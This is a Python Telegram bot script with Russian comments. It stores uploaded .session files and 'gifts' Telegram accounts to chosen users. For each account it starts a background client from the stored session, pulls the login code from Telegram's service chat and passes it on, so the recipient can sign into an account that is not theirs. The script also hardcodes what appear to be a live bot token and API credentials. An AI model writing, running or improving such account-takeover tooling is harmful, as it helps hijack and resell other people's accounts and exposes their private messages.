import os
import asyncio
import sqlite3
import base64
import logging
import threading
import re
from http.server import BaseHTTPRequestHandler, HTTPServer
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import CommandStart, Command
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from pyrogram import Client

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = "8876639758:AAFXOoDLyFd2C9B90QQlGRsd4-RnUMvqiZo"
ADMIN_ID = 8669477816

# Данные для запуска фоновых сессий (твои API ID и Hash)
API_ID = 39188918
API_HASH = "41aaeaa0c6f9a61c0504395ccf5f3b3c"

# --- ВЕБ-ЗАГЛУШКА ДЛЯ RENDER ---
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Bot and Login-System are Live!")
    def log_message(self, format, *args): return

def run_health_server():
    port = int(os.getenv("PORT", 8080))
    HTTPServer(("0.0.0.0", port), HealthCheckHandler).serve_forever()

# --- БАЗА ДАННЫХ ---
conn = sqlite3.connect("manager.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    file_name TEXT,
    session_data_b64 TEXT, 
    status TEXT DEFAULT 'free',
    owner_id INTEGER DEFAULT NULL
)
""")
conn.commit()

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Хранилище активных клиентов в памяти, чтобы читать коды динамически
active_clients = {}

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Статистика базы", callback_data="stats")],
        [InlineKeyboardButton(text="📥 Инструкция", callback_data="help")]
    ])

@dp.message(CommandStart())
async def start(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("👑 Привет, Админ! Функции раздачи и перехвата кодов активны.", reply_markup=admin_kb())
    else:
        await message.answer("👋 Привет! Я бот раздачи аккаунтов. Если админ подарит тебе аккаунт, я пришлю уведомление!")

@dp.callback_query(F.data == "stats")
async def call_stats(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID: return
    cursor.execute("SELECT COUNT(*) FROM accounts WHERE status='free'")
    free = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM accounts WHERE status='gifted'")
    gifted = cursor.fetchone()[0]
    await callback.message.answer(f"📈 **База аккаунтов:**\n\n🟢 Доступно для подарка: {free}\n🔴 Уже подарено: {gifted}")
    await callback.answer()

@dp.callback_query(F.data == "help")
async def call_help(callback: types.CallbackQuery):
    await callback.message.answer("📝 **Инструкция для Админа:**\n\n1. Отправь мне файл `.session` как документ — он сохранится в базу.\n2. Чтобы подарить аккаунт, напиши команду:\n`/gift ЧИСЛОВОЙ_ID_ПОЛЬЗОВАТЕЛЯ` (например, `/gift 12345678`)\n\nБот сам выберет первый свободный аккаунт и передаст его человеку.")
    await callback.answer()

# Прием документов от админа
@dp.message(F.document)
async def get_document(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    if not message.document.file_name.endswith(".session"):
        await message.answer("❌ Нужен только файл `.session`!")
        return
        
    file_info = await bot.get_file(message.document.file_id)
    file_bytes = await bot.download_file(file_info.file_path)
    b64_string = base64.b64encode(file_bytes.read()).decode('utf-8')
    
    cursor.execute("INSERT INTO accounts (file_name, session_data_b64) VALUES (?, ?)", (message.document.file_name, b64_string))
    conn.commit()
    await message.answer(f"✅ Аккаунт `{message.document.file_name}` успешно засейвлен в текстовую базу!")

# КОМАНДА ДЛЯ ПОДАРКА: /gift ID
@dp.message(Command("gift"))
async def gift_account(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("❌ Ошибка! Напиши команду правильно, например: `/gift 8669477816`")
        return
        
    target_user_id = int(args[1])
    
    # Ищем первый свободный аккаунт в базе
    cursor.execute("SELECT id, file_name FROM accounts WHERE status='free' LIMIT 1")
    account = cursor.fetchone()
    
    if not account:
        await message.answer("❌ В базе нет свободных аккаунтов! Сначала загрузи файл `.session`.")
        return
        
    acc_id, file_name = account
    
    # Обновляем статус аккаунта в базе данных
    cursor.execute("UPDATE accounts SET status='gifted', owner_id=? WHERE id=?", (target_user_id, acc_id))
    conn.commit()
    
    # Отправляем уведомление счастливчику
    try:
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🎁 Начать вход в аккаунт", callback_data=f"user_start_{acc_id}")]
        ])
        await bot.send_message(
            chat_id=target_user_id,
            text=f"🎉 **Вам сделали подарок!**\nАдмин подарил вам рабочий аккаунт Telegram.\n\nНажмите кнопку ниже, чтобы запустить процесс авторизации на вашем устройстве!",
            reply_markup=kb
        )
        await message.answer(f"✅ Аккаунт `{file_name}` успешно забронирован и отправлен пользователю `{target_user_id}`!")
    except Exception as e:
        await message.answer(f"❌ Не удалось отправить сообщение пользователю (возможно, бот заблокирован или не запущен пользователем): {e}")

# ОБРАБОТКА ДЕЙСТВИЙ ПОЛЬЗОВАТЕЛЯ (ВХОД И ПОЛУЧЕНИЕ КОДА)
@dp.callback_query(F.data.startswith("user_start_"))
async def user_start_login(callback: types.CallbackQuery):
    acc_id = int(callback.data.split("_")[2])
    
    cursor.execute("SELECT session_data_b64, owner_id FROM accounts WHERE id=?", (acc_id,))
    res = cursor.fetchone()
    
    if not res or res[1] != callback.from_user.id:
        await callback.answer("❌ Этот подарок вам не принадлежит или аннулирован.", show_alert=True)
        return
        
    b64_data = res[0]
    session_bytes = base64.b64decode(b64_data)
    
    # Восстанавливаем временный файл сессии на сервере для подключения
    temp_session_path = f"user_{callback.from_user.id}"
    with open(f"{temp_session_path}.session", "wb") as f:
        f.write(session_bytes)
        
    await callback.message.edit_text("⏳ Подключаемся к серверам Telegram для инициализации входа...")
    
    try:
        # Запускаем фоновый Pyrogram клиент для этого аккаунта
        app = Client(temp_session_path, api_id=API_ID, api_hash=API_HASH)
        await app.start()
        
        # Получаем информацию о привязанном номере телефона
        me = await app.get_me()
        phone = me.phone_number
        
        # Сохраняем запущенного клиента в глобальный массив, чтобы использовать при нажатии кнопок
        active_clients[callback.from_user.id] = app
        
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔑 Получить код подтверждения", callback_data=f"user_getcode_{acc_id}")]
        ])
        
        await callback.message.answer(
            f"📱 **Ваш подарочный аккаунт готов к входу!**\n\n"
            f"1. Откройте ваш официальный Telegram (на ПК или телефоне).\n"
            f"2. Начните вход по номеру телефона:\n`+{phone}` (нажмите на номер, чтобы скопировать).\n"
            f"3. Как только Telegram отправит код вовнутрь аккаунта, нажмите кнопку **«Получить код подтверждения»** ниже!",
            reply_markup=kb,
            parse_mode="Markdown"
        )
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка инициализации сессии. Обратитесь к админу. Текст: {e}")
    await callback.answer()

# НАЖАТИЕ КНОПКИ "ПОЛУЧИТЬ КОД"
@dp.callback_query(F.data.startswith("user_getcode_"))
async def user_get_code_msg(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    
    if user_id not in active_clients:
        await callback.answer("❌ Сессия закрыта. Нажмите кнопку входа заново.", show_alert=True)
        return
        
    app = active_clients[user_id]
    await callback.answer("🔎 Ищу код в чатах...")
    
    try:
        # Проверяем последние диалоги в аккаунте
        async for dialog in app.get_dialogs(limit=10):
            # Ищем системный чат Telegram (у него ID всегда 777000)
            if dialog.chat.id == 777000:
                # Берем последнее сообщение
                msg_text = dialog.top_message.text
                
                # Ищем регулярным выражением 5 цифр подряд (это и есть код авторизации)
                code_match = re.search(r'\b\d{5}\b', msg_text)
                
                if code_match:
                    code = code_match.group(0)
                    await callback.message.answer(
                        f"✉️ **Ваш код авторизации найден!**\n\n"
                        f"👉 Код: `{code}`\n\n"
                        f"Ввидите его на своем устройстве для завершения входа!"
                    )
                    
                    # Закрываем фоновый клиент и подчищаем файлы, чтобы не нагружать память
                    await app.stop()
                    del active_clients[user_id]
                    if os.path.exists(f"user_{user_id}.session"):
                        os.remove(f"user_{user_id}.session")
                    return
                    
        await callback.message.answer("⏳ Код пока не пришел или еще отправляется. Подождите 10-15 секунд в приложении и нажмите кнопку «Получить код» еще раз!")
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка при чтении кода: {e}")

async def main():
    threading.Thread(target=run_health_server, daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
    
